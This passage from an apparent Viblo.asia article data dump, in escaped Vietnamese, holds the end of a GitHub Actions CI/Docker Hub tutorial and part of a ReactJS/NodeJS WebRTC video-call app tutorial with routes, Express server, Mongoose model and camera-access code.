d\u1ee5: khi c\u00f3 s\u1ef1 ki\u1ec7n **push** l\u00ean repository, th\u00ec ch\u00fang ta mu\u1ed1n unit test \u0111\u01b0\u1ee3c ch\u1ea1y\n\n\u0110\u1ec3 Github Action ho\u1ea1t \u0111\u1ed9ng, ch\u00fang ta c\u1ea7n t\u1ea1o 1 folder `.github/workflows` v\u00e0 ch\u00fang ta s\u1ebd t\u1ea1o c\u00e1c workflow trong n\u00e0y. H\u00e3y t\u1ea1o file `push.yml`\n\n\u0110\u00e2y l\u00e0 nh\u1eefng g\u00ec ch\u00fang ta s\u1ebd th\u1ef1c hi\u1ec7n trong flow\n\n1. git clone the repo\n2. run npm install\n3. run npm lint\n4. run npm test\n5. build the docker image\n6 login to docker hub\n7. Push the image to docker hub\n\nFile `push.yml` s\u1ebd tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y\n\n{@embed: https://gist.github.com/abhinavdhasmana/78dc8a5c42ec93129006c7e290451f6b#file-push-yml}\n\nGi\u1ea3i th\u00edch qua 1 ch\u00fat v\u1ec1 file\n\nd\u00f2ng 1: S\u1ef1 ki\u1ec7n m\u00e0 ch\u00fang m\u00e0 mu\u1ed1n trigger, **push**\n\nd\u00f2ng 3\u20136: Ch\u00fang ta \u0111ang x\u00e1c \u0111\u1ecbnh m\u1ed9t job build-and-publish ch\u1ea1y tr\u00ean ubuntu m\u1edbi nh\u1ea5t. M\u1ed7i job ch\u1ea1y trong m\u1ed9t phi\u00ean kh\u00e1c nhau c\u1ee7a m\u00f4i tr\u01b0\u1eddng \u1ea3o. M\u1ed9t job c\u00f3 th\u1ec3 ch\u1ee9a m\u1ed9t ho\u1eb7c nhi\u1ec1u b\u01b0\u1edbc.\n\nd\u00f2ng 8: \u0110\u00e2y l\u00e0 b\u01b0\u1edbc 1 trong \u1ee9ng d\u1ee5ng c\u1ee7a ch\u00fang ta. \u1ede \u0111\u00e2y ch\u00fang ta s\u1ebd l\u1ea5y source code. B\u1ea1n c\u0169ng c\u00f3 th\u1ec3 vi\u1ebft ra 1 \u0111o\u1ea1n script c\u1ee7a ri\u00eang m\u00ecnh \u0111\u1ec3 pull code ho\u1eb7c s\u1eed \nd\u1ee5ng l\u1ea1i m\u1ed9t m\u00e3 ngu\u1ed3n m\u1edf.  https://github.com/actions/checkout\n\nd\u00f2ng 9-12: \u0110\u00e2y l\u00e0 b\u01b0\u1edbc 2 trong workerflow c\u1ee7a ch\u00fang ta, n\u01a1i ch\u00fang ta ch\u1ea1y npm install tr\u00ean source code. M\u1ed9t l\u1ea7n n\u1eefa, ch\u00fang ta s\u1eed d\u1ee5ng m\u1ed9t action ngu\u1ed3n m\u1edf t\u1ea1i https://github.com/actions/npm v\u00e0 chuy\u1ec3n \u0111\u1ed1i s\u1ed1.\n\nd\u00f2ng 13\u201320: \u0110\u00e2y l\u00e0 b\u01b0\u1edbc ch\u1ea1y test, ki\u1ec3m tra convention.\n\nd\u00f2ng 21\u201324: Ch\u00fang ta t\u1ea1o docker image cho source code v\u1edbi s\u1ef1 tr\u1ee3 gi\u00fap c\u1ee7a docker cli v\u00e0 g\u1eafn tag cho image l\u00e0 abhinavdhasmana/github-action-example-node\n\nd\u00f2ng 25-29: D\u00f2ng n\u00e0y l\u00e0 \u0111\u0103ng nh\u1eadp v\u00e0o Docker hub. \u1ede \u0111\u00e2y ch\u00fang ta s\u1eed d\u1ee5ng c\u00e1c secrest key \u0111\u01b0\u1ee3c chuy\u1ec3n d\u01b0\u1edbi d\u1ea1ng bi\u1ebfn env cho b\u1ea3n biuld. Ch\u00fang ta c\u00f3 th\u1ec3 \u0111\u1eb7t c\u00e1c bi\u1ebfn env n\u00e0y theo nhi\u1ec1u c\u00e1ch. \u0110\u1ec3 thi\u1ebft l\u1eadp \u0111i\u1ec1u n\u00e0y qua GitHub, h\u00e3y \u0111i t\u1edbi `Settings-> Secrets` v\u00e0 t\u1ea1o key m\u1edbi\n\n![](https://images.viblo.asia/16005134-765b-434a-bc3b-dde4c7e3cbfe.png)\n\nd\u00f2ng 30-33: Ch\u00fang ta \u0111\u1ea9y image v\u00e0o docker hub v\u1edbi th\u1ebb m\u00e0 ch\u00fang ta \u0111\u00e3 t\u1ea1o \u1edf d\u00f2ng 24.\n\nN\u1ebfu ch\u00fang ta push code, v\u00e0 comit thay \u0111\u1ed5i, GitHub Actions s\u1ebd ho\u1ea1t \u0111\u1ed9ng v\u00e0 b\u1eaft \u0111\u1ea7u ch\u1ea1y t\u1ea5t c\u1ea3 c\u00e1c b\u01b0\u1edbc trong workflow c\u1ee7a ch\u00fang ta. Ch\u00fang ta s\u1ebd th\u1ea5y m\u1ed9t c\u00e1i g\u00ec \u0111\u00f3 nh\u01b0 th\u1ebf n\u00e0y\n\n![](https://images.viblo.asia/caab822e-b48c-4216-9566-d7f8ac7e27c3.png)\n\nV\u00e0 ch\u00fang ta c\u00f3 th\u1ec3 l\u00ean DockerHub \u0111\u1ec3 th\u1ea5y image \u0111\u01b0\u1ee3c \u0111\u00e2y l\u00ean\n\n![](https://images.viblo.asia/c25989e0-6179-40f9-84bf-b80249dac97e.png)\n\nFull code \u0111\u01b0\u1ee3c \u0111\u1eb7t t\u1ea1i [Github](https://github.com/abhinavdhasmana/github-action-example-node)\n\nNgu\u1ed3n: [https://blog.bitsrc.io/](https://blog.bitsrc.io/)",
      published_at: "2020-11-19 23:37:10",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:04:05",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 2,
      views_count: 285,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/25ef678b-f2ef-49f0-a027-c3db79645835.png",
      user: {
        data: {
          id: 10418,
          url: "https://viblo.asia/u/trandanhha",
          avatar: "bd0de12e-6149-49e3-b7aa-e5941fda336f.jpg",
          name: "tran.danh.ha",
          username: "trandanhha",
          followers_count: 8,
          reputation: 486,
          posts_count: 47,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "github-actions",
            name: "Github Actions",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Github+Actions&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "cicd",
            name: "CI/CD",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=CICD&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 48416,
      title:
        "X\u00e2y d\u1ef1ng m\u1ed9t app g\u1ecdi video v\u1edbi ReactJs v\u00e0 NodeJs - B\u00e0i 1",
      slug: "yMnKM2rNZ7P",
      url:
        "https://viblo.asia/p/xay-dung-mot-app-goi-video-voi-reactjs-va-nodejs-bai-1-yMnKM2rNZ7P",
      user_id: 34730,
      moderation: null,
      transliterated: "xay-dung-mot-app-goi-video-voi-reactjs-va-nodejs-bai-1",
      contents_short:
        "Xin ch\u00e0o c\u00e1c b\u1ea1n, t\u1ef1 d\u01b0ng m\u1ed9t ng\u00e0y \u0111\u1eb9p tr\u1eddi mu\u1ed1n l\u00e0m 1 c\u00e1i app g\u1ecdi video. Well, ngo\u00e0i code th\u00ec c\u0169ng ch\u1eb3ng c\u00f3 g\u00ec l\u00e0m n\u00ean b\u1eaft tay v\u00e0o th\u00f4i. \u0110\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c demo n\u00e0y th\u00ec b\u1ea1n s\u1ebd ph\u1ea3i t\u00ecm hi\u1ec3u v\u1ec1 m\u1ed9t s\u1ed1 th\u1ee9...",
      contents:
        'Xin ch\u00e0o c\u00e1c b\u1ea1n, t\u1ef1 d\u01b0ng m\u1ed9t ng\u00e0y \u0111\u1eb9p tr\u1eddi mu\u1ed1n l\u00e0m 1 c\u00e1i app g\u1ecdi video. Well, ngo\u00e0i code th\u00ec c\u0169ng ch\u1eb3ng c\u00f3 g\u00ec l\u00e0m n\u00ean b\u1eaft tay v\u00e0o th\u00f4i. \u0110\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c demo n\u00e0y th\u00ec b\u1ea1n s\u1ebd ph\u1ea3i t\u00ecm hi\u1ec3u v\u1ec1 m\u1ed9t s\u1ed1 th\u1ee9 sau (kh\u00f4ng ph\u1ea3i master \u0111\u00e2u nha, c\u01a1 b\u1ea3n th\u00f4i l\u00e0 \u0111\u01b0\u1ee3c r\u1ed3i):\n\n *  ReactJS\n *  NodeJS\n *  WebRTC\n *  SocketIO\n\n# WebRTC\nReactJS, NodeJS, SocketIO th\u00ec ch\u1eafc m\u00ecnh s\u1ebd kh\u00f4ng n\u00f3i n\u1eefa, m\u1ecdi ng\u01b0\u1eddi c\u00f3 l\u1ebd c\u0169ng kh\u00e1 quen thu\u1ed9c v\u1edbi n\u00f3 r\u1ed3i. C\u00f2n WebRTC l\u00e0 g\u00ec? WebRTC (Web Real-Time Communication) l\u00e0 t\u1eadp h\u1ee3p c\u00e1c giao th\u1ee9c truy\u1ec1n th\u00f4ng cho ph\u00e9p tr\u00ecnh duy\u1ec7t giao ti\u1ebfp v\u1edbi nhau realtime (th\u1eddi gian th\u1ef1c). V\u1ec1 b\u1ea3n ch\u1ea5t, WebRTC l\u00e0 t\u1eadp h\u1ee3p c\u00e1c chu\u1ea9n v\u00e0 giao th\u1ee9c cho ph\u00e9p tr\u00ecnh duy\u1ec7t web th\u1ef1c hi\u1ec7n tr\u1ef1c ti\u1ebfp c\u00e1c t\u00ednh n\u0103ng truy\u1ec1n th\u00f4ng \u0111a ph\u01b0\u01a1ng ti\u1ec7n th\u1eddi gian th\u1ef1c nh\u01b0 g\u1ecdi \u0111i\u1ec7n, truy\u1ec1n h\u00ecnh, truy\u1ec1n d\u1eef li\u1ec7u, g\u1eedi tin nh\u1eafn b\u1eb1ng c\u00e1c APIs Javascripts. C\u00e1c b\u1ea1n c\u00f3 th\u1ec3 \u0111\u1ecdc th\u00eam \u1edf \u0111\u00e2y:\n\n* https://www.html5rocks.com/en/tutorials/webrtc/basics/\n* https://viblo.asia/p/gioi-thieu-ve-webrtc-va-huong-tiep-can-media-server-maGK7k3MKj2\n\n# B\u1eaft \u0111\u1ea7u\nN\u1ebfu c\u00e1c b\u1ea1n \u0111\u1ecdc nh\u1eefng b\u00e0i tr\u01b0\u1edbc c\u1ee7a m\u00ecnh th\u00ec m\u00ecnh build structure kh\u00e1 l\u00e0 ph\u1ee9c t\u1ea1p, ph\u00e2n chia nhi\u1ec1u th\u01b0 m\u1ee5c, s\u1eed d\u1ee5ng redux-saga \u0111\u1ec3 x\u1eed l\u00fd side effect, th\u00ec l\u1ea7n n\u00e0y m\u00ecnh s\u1ebd l\u00e0m \u0111on gi\u1ea3n th\u00f4i. S\u1ebd c\u00f3 1 trang \u0111\u1ec3 t\u1ea1o room ho\u1eb7c nh\u1eadp code room, v\u00e0 1 trang \u0111\u1ec3 hi\u1ec3n th\u1ecb c\u00e1c user \u0111ang g\u1ecdi video cho nhau.\n\nT\u1ea1o project v\u1edbi `create-react-app`\n```\nnpx create-react-app reactjs-video-call\n```\n\n\nSau \u0111\u00f3 s\u1ebd t\u1ea1o file routes trong `src`\n\n```routes/index.js \nimport React from \'react\';\nimport { Switch, Route } from \'react-router-dom\';\nimport Home from \'../views/home\';\nimport Room from \'../views/room\';\n\nconst Routes = () => (\n    <Switch>\n        <Route\n            exact\n            path=\'/\'\n            component={Home}\n        />\n        <Route\n            exact\n            path=\'/room/:code\'\n            component={Room}\n        />\n    </Switch>\n);\n\nexport default Routes;\n```\n\n\u0110\u1ec3 l\u00e0m giao di\u1ec7n th\u00ec v\u1eabn s\u1eed d\u1ee5ng th\u01b0 vi\u1ec7n quen thu\u1ed9c `ant design`\n\n```App.js\nimport { BrowserRouter as Router, useHistory } from \'react-router-dom\';\nimport \'antd/dist/antd.css\';\nimport Routes from \'./routes\';\nimport \'./App.scss\';\n\nconst App = () => {\n  const history = useHistory();\n  return (\n    <div className="App">\n      <Router history={history}>\n        <Routes />\n      </Router>\n    </div>\n  )\n}\n\nexport default App;\n```\n\n## Trang ch\u1ee7\n\nGiao di\u1ec7n trang ch\u1ee7 th\u00ec m\u00ecnh l\u00e0m r\u1ea5t \u0111\u01a1n gi\u1ea3n th\u00f4i, ch\u1ec9 l\u00e0 c\u00f3 1 n\u00fat t\u1ea1o ph\u00f2ng v\u00e0 1 \u00f4 input \u0111\u1ec3 nh\u1eadp room code cho ai mu\u1ed1n join. C\u00f2n b\u1ea1n mu\u1ed1n l\u00e0m \u0111\u1eb9p v\u00e0 x\u1ecbn th\u00ec h\u00e3y t\u1ef1 custom theo \u00fd m\u00ecnh nh\u00e9 :D \n\n```javascript\n\nimport React, { useState } from \'react\';\nimport { Row, Col, Input } from \'antd\';\nimport axios from \'axios\';\n\nconst Home = (props) => {\n    const apiUrl = process.env.REACT_APP_API_URL;\n    const { history } = props;\n    const [roomCode, setRoomCode] = useState(\'\');\n\n    const onCreateRoom = () => {\n        axios.post(`${apiUrl}/create-room`).then((res) => {\n            history.push(`/room/${res.data.code}`);\n        });\n    }\n\n    const onJoinRoom = () => {\n            axios.get(`${apiUrl}/get-room/${roomCode}`).then((res) => {\n                history.push(`/room/${res.data.code}`);\n        }).catch(err => {\n            console.log(err);\n        });\n    }\n\n    return (\n        <>\n            <Row style={{ height: \'100%\' }}>\n                <Col span={24}>\n                    <button\n                        className=\'button__primary\'\n                        onClick={onCreateRoom}\n                        style={{ marginBottom: \'30px\' }}\n                    >\n                        Create Room\n                     </button>\n\n                    <Input\n                        style={{\n                            display: \'block\',\n                            width: \'500px\',\n                            height: \'40px\',\n                            marginBottom: \'10px\'\n                        }}\n                        onChange={(input) => setRoomCode(input.target.value)}\n                        name=\'room-code\'\n                    />\n                    <button\n                        className=\'button__primary\'\n                        onClick={onJoinRoom}\n                    >\n                        Join Room\n                     </button>\n                </Col>\n                <Col span={24}>\n\n                </Col>\n            </Row>\n        </>\n    )\n};\n\nexport default Home;\n```\n\n\u1ede \u0111\u00e2y l\u00e0 m\u00ecnh \u0111ang \u0111\u01b0a cho c\u00e1c b\u1ea1n \u0111o\u1ea1n code ho\u00e0n ch\u1ec9nh c\u1ee7a m\u00ecnh r\u1ed3i. V\u00e0 \u0111\u1ec3 cho \u0111o\u1ea1n code n\u00e0y ho\u00e0n thi\u1ec7n th\u00ec ch\u00fang ta c\u1ea7n \u0111i x\u00e2y d\u1ef1ng th\u00eam t\u00ednh n\u0103ng t\u1ea1o v\u00e0 join v\u00e0o ph\u00f2ng. C\u00f2n giao di\u1ec7n c\u1ee7a m\u00ecnh ch\u1ec9 tr\u00f4ng th\u1ebf n\u00e0y th\u00f4i:\n![](https://images.viblo.asia/751fb53a-117a-4081-bd14-e29574cdce0c.png)\n\n\n## T\u1ea1o v\u00e0 tham gia v\u00e0o ph\u00f2ng\nV\u00e0 gi\u1edd ch\u00fang ta s\u1ebd t\u1ea1o 1 project NodeJS \u0111\u1ec3 l\u00e0m backend. \u0110\u1ea7u ti\u00ean ch\u1ea1y c\u00e2u l\u1ec7nh \n```\nnpm init\n```\nV\u00e0 c\u1ee9 next \u0111\u1ebfn h\u1ebft lu\u00f4n c\u0169ng nh\u00e9 :D. L\u00fac n\u00e0y b\u1ea1n s\u1ebd c\u00f3 1 file `package.json` nh\u1eefng n\u00f3 s\u1ebd kh\u00f4ng gi\u1ed1ng m\u00ecnh \u1edf d\u01b0\u1edbi \u0111\u00e2u nh\u00e9, kia l\u00e0 m\u00ecnh \u0111\u00e3 c\u00f3 c\u00e0i th\u00eam c\u00e1c package. V\u00e0 m\u00ecnh c\u00f3 s\u1eed d\u1ee5ng th\u00eam `nodemon` \u0111\u1ec3 gi\u00e1m s\u00e1t s\u1ef1 thay \u0111\u1ed5i c\u1ee7a file, \u0111i\u1ec1u n\u00e0y s\u1ebd gi\u00fap m\u00ecnh kh\u00f4ng ph\u1ea3i ch\u1ea1y l\u1ea1i start m\u1ed7i khi mu\u1ed1n build code m\u1edbi m\u00e0 nodemon s\u1ebd t\u1ef1 quan s\u00e1t v\u00e0 bi\u1ebft \u0111\u1ec3 t\u1ef1 ch\u1ea1y l\u1ea1i gi\u00fap m\u00ecnh.\n\n```package.json\n{\n  "name": "demo-video-call",\n  "version": "1.0.0",\n  "description": "",\n  "main": "index.js",\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1",\n    "dev": "nodemon --watch \'./src/**/*.ts\' --exec \'ts-node\' ./src/server.ts",\n    "start": "ts-node ./src/server.ts"\n  },\n  "author": "",\n  "license": "ISC",\n  "dependencies": {\n    "@types/mongoose": "^5.7.36",\n    "@types/node": "^14.14.2",\n    "cors": "^2.8.5",\n    "dotenv": "^8.2.0",\n    "express": "^4.17.1",\n    "mongoose": "^5.10.11",\n    "socket.io": "^2.3.0",\n    "ts-node": "^9.0.0",\n    "typescript": "^4.0.3"\n  }\n}\n```\n\n```tsconfig.json\n{\n    "compilerOptions": {\n      "sourceMap": true,\n      "target": "es2017",\n      "outDir": "./dist",\n      "baseUrl": "./src",\n      "esModuleInterop":true,\n      "allowSyntheticDefaultImports": true\n    },\n    "include": [\n      "src/**/*.ts"\n    ],\n    "exclude": [\n      "node_modules"\n    ]\n}\n```\n\n```.env\nPORT=7000\nDB_CONNECT=LINK_CONNECT_MONGO_DB\n```\n\nV\u00e0 t\u1eeb gi\u1edd t\u1ea5t c\u1ea3 c\u00e1c file m\u00ecnh s\u1ebd \u0111\u1ec1u \u0111\u01b0a v\u00e0o trong `src` nh\u00e9\n\u0110\u1ea7u ti\u00ean th\u00ec ch\u00fang ta s\u1ebd t\u1ea1o 1 file `server.ts`, n\u00f3 t\u01b0\u01a1ng t\u1ef1 nh\u01b0 file index v\u1eady, kh\u1edfi ngu\u1ed3n c\u1ee7a h\u1ea1nh ph\u00fac v\u00e0 kh\u1ed5 \u0111au \u0111\u1ec1u b\u1eaft ngu\u1ed3n t\u1eeb \u0111\u00e2y. V\u00e0 ch\u00fang ta s\u1ebd c\u1ea7n connect \u0111\u01b0\u1ee3c v\u1edbi DB tr\u01b0\u1edbc \u0111\u00e3\n```server.ts\nimport mongoose from \'mongoose\';\nimport dotenv from \'dotenv\';\n\ndotenv.config();\n\nmongoose.connect(\n    process.env.DB_CONNECT,\n    { useUnifiedTopology: true, useNewUrlParser: true },\n    () => console.log(\'DB Connected\')\n  );\n```\n\nGi\u1edd h\u00e3y ch\u1ea1y\n```\nnpm run dev\n```\nV\u00e0 \u0111\u00e2y l\u00e0 k\u1ebft qu\u1ea3 b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y \u0111\u01b0\u1ee3c\n\n![](https://images.viblo.asia/e4d5887a-81ae-4def-bb3c-c85cbc881cb8.png)\n\n\nGi\u1edd t\u1ea1o th\u00eam 1 file n\u1eefa n\u00e0o\n```chat-server.ts\nimport express from "express";\nimport dotenv from "dotenv";\nimport path from "path";\nimport { createServer, Server } from "http";\n\ndotenv.config();\n\nexport class ChatServer {\n    private app: express.Application;\n    private port: string;\n    private server: Server;\n\n    constructor() {\n        this.createApp();\n        this.config();\n        this.createServer();\n        this.listen();\n    }\n\n    private createApp(): void {\n        this.app = express();\n        this.app.use(express.static(path.join(__dirname, "../public")));\n    }\n\n    private config(): void {\n        this.port = process.env.PORT;\n        this.app.set(\'port\', this.port);\n    }\n\n    private listen = async () => {\n        this.server.listen(this.port);\n    };\n\n    private createServer(): void {\n        this.server = createServer(this.app);\n    }\n\n    public getApp(): express.Application {\n        return this.app;\n    }\n}\n```\n\nL\u1ea7n n\u00e0y c\u00e1c b\u1ea1n s\u1ebd th\u1ea5y m\u00ecnh bi\u1ebft ph\u1ee9c t\u1ea1p h\u01a1n l\u1ea7n tr\u01b0\u1edbc. Nh\u01b0ng c\u00e1 nh\u00e2n m\u00ecnh th\u1ea5y vi\u1ebft th\u1ebf n\u00e0y v\u1ec1 sau n\u1ebfu c\u1ea7n m\u1edf r\u1ed9ng s\u1ebd ti\u1ec7n v\u00e0 clear h\u01a1n. V\u00e0 n\u1ebfu cho b\u1ea1n n\u00e0o ch\u01b0a bi\u1ebft th\u00ec \u1edf \u0111\u00e2y m\u00ecnh \u0111ang d\u00f9ng `typescript` nh\u00e9. N\u1ebfu c\u00e1c b\u1ea1n nh\u00ecn v\u00e0o `constructor` th\u00ec th\u1ec3 c\u00f3 th\u1ec3 th\u1ea5y m\u00ecnh kh\u1edfi t\u1ea1o app t\u1eeb express, sau \u0111\u00f3 g\u00e1n port trong `.env` v\u00e0o bi\u1ebfn port r\u1ed3i set cho app port \u0111\u00f3, sau \u0111\u00f3 create server t\u1eeb app, cu\u1ed1i c\u00f9ng l\u00e0 l\u1eafng nghe port \u0111\u00f3.\n\nV\u00e0 gi\u1edd ch\u00fang ta c\u1ea7n t\u1ea1o model room\n```models/Room.js\nconst mongoose = require(\'mongoose\');\nconst Schema = mongoose.Schema;\n\nconst RoomSchema = new Schema({\n    _id: Schema.Types.ObjectId,\n    code: {\n        type: String,\n        required: true,\n        max: 10\n    },\n    status: {\n        type: Number,\n        required: true\n    }\n});\n\nmodule.exports = mongoose.model(\'Room\', RoomSchema);\n```\n\nsau khi c\u00f3 model r\u1ed3i th\u00ec h\u00e3y t\u1ea1o route nh\u00e9\n```routes/index.ts\nimport * as express from \'express\';\nimport * as path from \'path\';\nimport mongoose from \'mongoose\';\nimport Room from "../models/Room";\n\nexport class Routes {\n    private app: express.Application;\n    private rootFolder: String;\n\n    constructor(app) {\n        this.app = app;\n    }\n\n    private createRoom(): void {\n        this.app.post(\'/create-room\', async (request, response) => {\n            let roomCode = await this.makeRandomString(5);\n            let checkRoomCodeExist = await Room.find({ code: roomCode }).exec();\n            \n            while (checkRoomCodeExist.length) {\n                checkRoomCodeExist = await this.makeRandomString(5);\n                checkRoomCodeExist = await Room.find({ code: roomCode }).exec();\n            }\n\n            const room = await new Room({\n                _id: new mongoose.Types.ObjectId(),\n                code: roomCode,\n                status: 1\n            });\n\n            try {\n                const newRoom = await room.save();\n                await response.send(newRoom);\n            } catch (err) {\n                response.status(400).send(err);\n            }\n        });\n    }\n\n    private getRoom(): void {\n        this.app.get(\'/get-room/:code\', async (request, response) => {\n            const roomCode = request.params.code;\n            const room = await Room.findOne({ code: roomCode }).exec();\n            \n            if (!room) {\n                return response.status(400).send({\n                    \'message\': \'not found\'\n                });\n            }\n\n            return response.status(200).send(room);\n        })\n    }\n\n    private makeRandomString = function(length) {\n        let firstString  = \'\';\n        let secondString = \'\';\n        const characters = \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\';\n        const charactersLength = characters.length;\n\n        for ( let i = 0; i < length; i++ ) {\n            firstString += characters.charAt(Math.floor(Math.random() * charactersLength));\n        }\n\n        for ( let i = 0; i < length; i++ ) {\n            secondString += characters.charAt(Math.floor(Math.random() * charactersLength));\n        }\n\n        return `${firstString}-${secondString}`;\n     }\n\n    public getRoutes(): void {\n        this.createRoom();\n        this.getRoom();\n    }\n}\n```\n\nV\u1ec1 vi\u1ec7c t\u1ea1o room th\u00ec m\u00ecnh s\u1ebd t\u1ea1o 2 random string r\u1ed3i gh\u00e9p l\u1ea1i, sau \u0111\u00f3 ki\u00eam tra xem code \u0111\u00f3 \u0111\u00e3 c\u00f3 tr\u00ean DB ch\u01b0a, n\u1ebfu c\u00f3 r\u1ed3i th\u00ec ti\u1ebfp t\u1ee5c ch\u1ea1y l\u1ea1i qu\u00e1 tr\u00ecnh t\u1ea1o m\u00e3 \u0111\u00f3 l\u1ea1i l\u1ea7n n\u1eefa, n\u1ebfu ch\u01b0a th\u00ec t\u1ea1o room v\u00e0 tr\u1ea3 v\u1ec1 th\u00f4ng tin \u0111\u00f3. C\u00f2n `getRoom()` th\u00ec ch\u1eafc c\u0169ng kh\u00f4ng c\u00f3 qu\u00e1 nhi\u1ec1u \u0111i\u1ec1u \u0111\u1ec3 n\u00f3i\n\nV\u00e0 gi\u1edd file `server.ts` c\u1ee7a ch\u00fang ta s\u1ebd tr\u00f4ng nh\u01b0 n\u00e0y:\n```javascript\nimport mongoose from \'mongoose\';\nimport dotenv from \'dotenv\';\nimport cors from \'cors\';\nimport { ChatServer } from \'./chat-server\';\nimport { Routes } from \'./routes/index\';\n\n\ndotenv.config();\n\nmongoose.connect(\n    process.env.DB_CONNECT,\n    { useUnifiedTopology: true, useNewUrlParser: true },\n    () => console.log(\'DB Connected\')\n  );\n \nlet app = new ChatServer().getApp();\napp.use(cors());\nconst routes = new Routes(app);\n \nroutes.getRoutes();\n \nexport default app;\n```\n\nM\u00ecnh ph\u1ea3i d\u00f9ng cors v\u00ec 2 url kh\u00e1c nhau s\u1ebd v\u01b0\u1edbng ph\u1ea3i policy c\u1ee7a google\n\n## T\u1ea1o view room\n\n```views/room/index.js\n\nimport React, { useEffect, useRef, useState } from \'react\';\nimport { Row, Col } from \'antd\';\nimport * as Chance from \'chance\';\nimport Video from \'./video\';\nimport \'./room.scss\';\n\nconst Room = (props) => {\n    const chance = new Chance();\n    const { history } = props;\n    const [userDetail] = useState({\n        id: chance.guid(),\n        name: chance.name(),\n    });\n    const refVideo = useRef();\n    const roomCode = props.match.params.code;\n\n    useEffect(() => {\n        const video = refVideo.current;\n        navigator.mediaDevices\n            .getUserMedia({ video: true, audio: true })\n            .then((stream) => {\n                refVideo.current.srcObject = stream;\n            });\n    }, []);\n\n    return (\n        <>\n            <Row style={{ height: \'100%\' }}>\n                <Col span={18} className=\'room__video-container\'>\n                    <Row>\n                        <Col style={{ marginBottom: \'20px\' }} span={8}>\n                            <video className=\'room__video-container--user-video\' muted ref={refVideo} autoPlay playsInline />\n                            <div className=\'room__video-container--user-name\'>{userDetail.name}</div>\n                        </Col>\n                    </Row>\n                </Col>\n                <Col span={6} className=\'room__left-bar\'>\n                    Chat Area\n                </Col>\n            </Row>\n\n        </>\n    )\n};\n\nexport default Room;\n```\nGiao di\u1ec7n n\u00e0y th\u00ec m\u00ecnh l\u00e0m c\u0169ng kh\u00e1 \u0111\u01a1n gi\u1ea3n th\u00f4i, g\u1ed3m 1 v\u00f9ng hi\u1ec3n th\u1ecb video c\u1ee7a nh\u1eefng user \u0111ang trong ph\u00f2ng v\u00e0 1 v\u00f9ng \u0111\u1ec3 chat. Hi\u1ec7n t\u1ea1i th\u00ec m\u00ecnh s\u1ebd \u0111i l\u00e0m t\u00ednh n\u0103ng video tr\u01b0\u1edbc, sau \u0111\u00f3 th\u00ec quay l\u1ea1i ph\u1ea7n chat sau. \u0110\u1ea7u ti\u00ean th\u00ec m\u00ecnh c\u1ea7n ph\u00e2n bi\u1ec7t c\u00e1c user v\u1edbi nhau, nh\u01b0ng m\u00e0 m\u00ecnh ch\u1ec9 l\u00e0m \u0111\u01a1n gi\u1ea3n n\u00ean l\u00e0 s\u1ebd kh\u00f4ng c\u00f3 h\u1ec7 th\u1ed1ng \u0111\u0103ng nh\u1eadp r\u1ed3i x\u00e1c nh\u1eadn xem ai \u0111ang \u0111\u0103ng nh\u1eadp, m\u00e0 s\u1ebd d\u00f9ng package l\u00e0 [chance](https://chancejs.com/). \u0110\u00e2y kh\u00f4ng ph\u1ea3i l\u00e0 1 package h\u1ed7 tr\u1ee3 l\u00e0m \u0111\u0103ng nh\u1eadp m\u00e0 n\u00f3 s\u1ebd gi\u00fap ch\u00fang ta t\u1ea1o nh\u1eefng d\u1eef li\u1ec7u t\u0129nh 1 c\u00e1ch ng\u1eabu nhi\u00ean. \u1ede \u0111\u00e2y th\u00ec v\u1edbi m\u1ed7i l\u1ea7n Component \u0111\u01b0\u1ee3c kh\u1edfi t\u1ea1o th\u00ec s\u1ebd t\u1ea1o ra 1 user v\u1edbi name v\u00e0 id, ngh\u0129a l\u00e0 khi b\u1ea1n f5 c\u0169ng s\u1ebd l\u00e0m cho user hi\u1ec7n t\u1ea1i c\u1ee7a b\u1ea1n bi\u1ebfn m\u1ea5t v\u00e0 thay v\u00e0o \u0111\u00f3 l\u00e0 user m\u1edbi. Ti\u1ebfp t\u1edbi ch\u00fang ta s\u1ebd custom l\u1ea1i DOM c\u1ee7a th\u1ebb video ch\u00fat b\u1eb1ng vi\u1ec7c l\u1ea5y d\u1eef li\u1ec7u t\u1eeb cam m\u00e1y c\u1ee7a ch\u00fang ta v\u00e0 thay th\u1ebf v\u00e0o. Wala, m\u1eb7t c\u1ee7a b\u1ea1n \u0111\u00e3 xu\u1ea5t hi\u1ec7n tr\u00ean m\u00e0n h\u00ecnh r\u1ed3i (ph\u1ea3i thu\u00ea con m\u1ed3n l\u00e8o l\u00e0m di\u1ec5n vi\u00ean m\u00e0 m\u1eb7t n\u00f3 ch\u1eb3ng c\u00f3 t\u00ed c\u1ea3m x\u00fac g\u00ec, ch\u00e1n :()\n\n![](https://images.viblo.asia/2508115a-62f0-407e-80b7-262c4fb08e90.png)\n\nOk, t\u1ea1m th\u1eddi \u0111\u1ebfn \u0111\u00e2y th\u00f4i, m\u00ecnh ph\u1ea3i \u0111\u01b0a con trong \u1ea3nh \u0111i kh\u00e1m ch\u1ee9 m\u1ea5y h\u00f4m nay n\u00f3 c\u1ee9 h\u1eaft h\u01a1i li\u00ean t\u1ee5c. \u1ede b\u00e0i vi\u1ebft l\u1ea7n n\u00e0y th\u00ec ch\u01b0a c\u00f3 s\u1ef1 xu\u1ea5t hi\u1ec7n c\u1ee7a 